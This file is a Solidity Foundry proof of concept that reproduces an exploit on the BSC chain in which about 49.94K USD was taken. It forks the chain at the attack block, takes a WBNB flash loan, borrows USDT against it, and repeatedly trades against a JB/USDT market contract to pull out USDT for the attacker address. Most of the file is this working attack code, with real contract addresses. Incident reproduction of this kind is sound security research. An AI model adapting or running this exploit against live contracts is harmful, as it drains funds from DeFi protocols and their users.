// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 49.94K USD
// Attacker : 0xd99e1abfc5dd5034d7ff63828d16c5e945d1b856
// Attack Contract : 0xcc21c75f9e13054667663f9ed37f41e65b52dee7
// Vulnerable Contract : 0xcc21c75f9e13054667663f9ed37f41e65b52dee7
// Attack Tx : 0x54e120b8d62a9d7cef94bf51f1f5b8aa13565d76d8797a79afeeb25ed0e1dc25
// Block : 104980467
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 49.94K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 104980466;
    uint256 constant TX_TIMESTAMP = 1781799357;
    uint256 constant TX_BLOCK_NUMBER = 104980467;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 49958056380441202939144);
    }
}

contract OurAttack {
    uint256 private constant FLASH_WBNB = 417464102426572951120812;
    uint256 private constant BORROW_USDT = 70000000000000000000000000;
    uint256 private constant UNIT_SCALE = 1000000000000000000;

    function attack() external payable {
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.ERC1967Proxy);
        bytes memory callbackPayload =
            abi.encode(Addresses.JB, Addresses.Cake_LP, uint256(156087351427964755096716338764435988280494450391));
        IMoolahFlashLender(Addresses.ERC1967Proxy).flashLoan(Addresses.WBNB, FLASH_WBNB, callbackPayload);
        uint256 usdtProfit = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtProfit);
    }

    function flashCallback() internal {
        _replayDone[REPLAY_CALLBACK_1] = true;
        flashCallback2();
        flashCallback8();
        flashCallback14();
    }

    function flashCallback2() internal {
        IComptroller(Addresses.Comptroller).enterMarkets(_addressArray1(Addresses.vWBNB));
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IvWBNB(Addresses.vWBNB).mint(FLASH_WBNB);
        IvUSDT(Addresses.vUSDT).borrow(BORROW_USDT);
        IERC20Like(Addresses.USDT).approve(Addresses.JbUsdtMarket, type(uint256).max);
        IERC20Like(Addresses.JB).approve(Addresses.JbUsdtMarket, type(uint256).max);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        _tradeUsdt(BORROW_USDT);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2326198465330948121645796);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2279674496024329159212880);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2234081006103842576028622);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2189399385981765724508050);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2145611398262130410017889);
        IERC20Like(Addresses.JB).balanceOf(address(this));
    }

    function flashCallback8() internal {
        _tradeJb(2102699170296887801817531);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2060645186890950045781180);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(2019432283153131044865557);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(1979043637490068423968245);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(1939462764740267055488881);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(1900673509445461714379103);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(1862660039256552480091521);
        IERC20Like(Addresses.JB).balanceOf(address(this));
    }

    function flashCallback14() internal {
        _tradeJb(1825406838471421430489690);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(1788898701701993001879897);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(1753120727667953141842299);
        IERC20Like(Addresses.JB).balanceOf(address(this));
        _tradeJb(85902915655729703950272662);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP);
        IvUSDT(Addresses.vUSDT).repayBorrow(BORROW_USDT);
        IvWBNB(Addresses.vWBNB).redeemUnderlying(FLASH_WBNB);
    }

    function _tradeUsdt(uint256 amount) internal {
        (bool ok,) = Addresses.JbUsdtMarket.call(abi.encodeWithSelector(bytes4(0xd680aabd), amount, 0, UNIT_SCALE));
        require(ok, "USDT market trade failed");
    }

    function _tradeJb(uint256 amount) internal {
        (bool ok,) = Addresses.JbUsdtMarket.call(abi.encodeWithSelector(bytes4(0x53a9fcbc), amount, 0, UNIT_SCALE));
        require(ok, "JB market trade failed");
    }

    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        if (!_replayDone[REPLAY_CALLBACK_1]) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x725f497f) {
            IERC20Like(Addresses.WBNB).balanceOf(Addresses.ERC1967Proxy);
            bytes memory callbackPayload =
                abi.encode(Addresses.JB, Addresses.Cake_LP, uint256(156087351427964755096716338764435988280494450391));
            IMoolahFlashLender(Addresses.ERC1967Proxy).flashLoan(Addresses.WBNB, FLASH_WBNB, callbackPayload);
            uint256 usdtProfit = IERC20Like(Addresses.USDT).balanceOf(address(this));
            IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtProfit);
            return;
        }
    }

    bytes32 private constant REPLAY_CALLBACK_1 = keccak256("poc.replay.REPLAY_CALLBACK_1");
    mapping(bytes32 => bool) private _replayDone;

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }
}

library Addresses {
    address internal constant JbUsdtMarket = 0x1B5732Eb98911c25acf7bDfAffB9409782CAE6d7;
    address internal constant Cake_LP = 0x43932cbb49c363F68655b5Ad2950ED4630CB49F8;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant vWBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9;
    address internal constant ERC1967Proxy = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_contract = 0xCC21c75F9E13054667663f9Ed37F41e65B52DEE7;
    address internal constant JB = 0xcF92E7eF4A63D52dc15F45A24f4F815f00f299a7;
    address internal constant attacker_eoa = 0xD99E1aBfC5dd5034D7FF63828D16c5E945D1b856;
    address internal constant Comptroller = 0xfD36E2c2a6789Db23113685031d7F16329158384;
    address internal constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
}

interface IComptroller {
    function enterMarkets(address[] calldata) external;
}

interface IMoolahFlashLender {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IvUSDT {
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
}

interface IvWBNB {
    function mint(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}
